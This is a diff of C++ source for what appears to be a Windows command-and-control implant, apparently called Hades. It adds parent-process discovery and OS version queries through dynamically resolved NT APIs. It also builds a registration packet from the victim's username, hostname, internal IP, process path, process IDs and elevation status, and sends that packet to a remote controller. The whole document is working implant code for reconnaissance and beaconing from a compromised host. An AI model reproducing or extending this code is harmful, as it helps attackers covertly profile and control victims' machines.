@@ -1,20 +1,27 @@
 #include <WS2tcpip.h>
 #include <stdio.h>
 #include <iphlpapi.h>
-#include "common.hpp"
-#include "apidefs.hpp"
-#include "bytes.hpp"
-#include "nt.hpp"
-#include "network.hpp"
+#include "../shared/common.hpp"
+#include "../utils/apidefs.hpp"
+#include "../utils/bytes.hpp"
+#include "../shared/nt.hpp"
+#include "../networkd/network.hpp"
 #include "config.hpp"
 
 
 WINAPIS* WinApis = NULL;
 MODULES* kModules = NULL;
 
-BOOL GetVer(RTL_OSVERSIONINFOW* ver) {
-	ver->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-	return WinApis->RtlGetVersion(ver);
+#define MSG_REGISTER 1
+
+BOOL GetVer(DWORD *minor, DWORD *major, DWORD *build) {
+	DWORD m, mm, b;
+	WinApis->RtlGetNtVersionNumbers(&m, &mm, &b);
+	b &= 0x0FFFFFFF;
+	*minor = mm;
+	*major = m;
+	*build = b;
+	return TRUE;
 }
 
 
@@ -122,8 +129,15 @@ PBYTE GetInternalIP(DWORD* out) {
 		}
 	}
 	return NULL;
+}
 
 
+ULONG GetPPID() {
+	PROCESS_BASIC_INFORMATION pBI = { 0 };
+	ULONG RetLen = 0;
+
+	NTSTATUS Stat = WinApis->NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pBI, sizeof(pBI), &RetLen);
+	return (ULONGLONG)(ULONG_PTR)pBI.InheritedFromUniqueProcessId;
 
 }
 
@@ -135,10 +149,12 @@ BOOL InitAgent() {
 	g_ByteMgr = AllocMemory <bytes>    (sizeof(bytes));
 	g_Network = AllocMemory <Network>  (sizeof(Network));
 	if (!LoadAPIS()) { return FALSE; }
-	if (!LoadConfig()) { return FALSE };
+	if (!LoadConfig()) { return FALSE; }
+	*g_Network = Network();
 	
 
-	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen;
+
+	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen, Major, Minor, Build;;
 
 	ULONG HadesID     = GenID();
 	PBYTE User        = CollectUser         (&UserLen);
@@ -148,16 +164,35 @@ BOOL InitAgent() {
 	PBYTE IpAddr      = GetInternalIP       (&IpLen);
 	DWORD TID         = TO_DWORD            (GetTeb()->ClientId.UniqueThread);
 	DWORD PID         = TO_DWORD            (GetTeb()->ClientId.UniqueProcess);
+	DWORD PPID = GetPPID();
 	BOOL Arch         = (sizeof(void*) != 4);
 	BOOL IsElev       = IsElevated();
-	RTL_OSVERSIONINFOW osVer;
-	GetVer(&osVer);
-
-	PBYTE RegisterBytes = AllocMemory<BYTE>(BASE_BUFFER_SIZE);
+	GetVer(&Minor, &Major, &Build);
 
 
-	// todo, clean this up
-	g_ByteMgr->InitWrite(RegisterBytes, BASE_BUFFER_SIZE);
+	
+
+	/*
+		[MSG TYPE]		  4 BYTES
+		[HADES ID]		  4 BYTES
+		[UserLen]         4 BYTES
+		[Username]		  N BYTES
+		[HostLen]		  4 BYTES
+		[Hostname]		  N BYTES
+		[IP LEN]		  4 BYTES
+		[IP STR]		  N BYTES
+		[ProcessPath Len] 4 BYTES
+		[PROCESS PATH]    N BYTES
+		[PID]			  4 BYTES
+		[TID]			  4 BYTES
+		[PPID]			  4 BYTES
+		[IsElev]		  1 BYTES
+		[Arch]			  1 BYTES
+		[Minor]			  4 BYTES
+		[Major]			  4 BYTES
+		[Build]			  4 BYTES*/
+	g_ByteMgr->InitWrite();
+	g_ByteMgr->Write4(1);
 	g_ByteMgr->Write4(HadesID);
 	g_ByteMgr->Write4(UserLen);
 	g_ByteMgr->WriteString(User, UserLen);
@@ -169,11 +204,14 @@ BOOL InitAgent() {
 	g_ByteMgr->WriteString(ProcessPath, ProcessPathLen);
 	g_ByteMgr->Write4(PID);
 	g_ByteMgr->Write4(TID);
+	g_ByteMgr->Write4(PPID);
 	g_ByteMgr->Write1(IsElev);
 	g_ByteMgr->Write1(Arch);
-	g_ByteMgr->Write4(osVer.dwMinorVersion);
-	g_ByteMgr->Write4(osVer.dwMajorVersion);
-	g_ByteMgr->Write4(osVer.dwBuildNumber);
+	g_ByteMgr->Write4(Minor);
+	g_ByteMgr->Write4(Major);
+	g_ByteMgr->Write4(Build);
+	g_Network->RegisterClient(g_ByteMgr->OutData, g_ByteMgr->index);
+	
 
 
 
@@ -182,7 +220,7 @@ BOOL InitAgent() {
 	if (Host)        { HeapFree(GetProcessHeap(), 0, Host);        }
 	if (Domain)      { HeapFree(GetProcessHeap(), 0, Domain);      }
 	if (ProcessPath) { HeapFree(GetProcessHeap(), 0, ProcessPath); }
-	if (IpAddr)      { HeapFree(GetProcessHeap(), 0, IpAddr); }
+	if (IpAddr)      { HeapFree(GetProcessHeap(), 0, IpAddr);      }
 	return TRUE;
 
 }
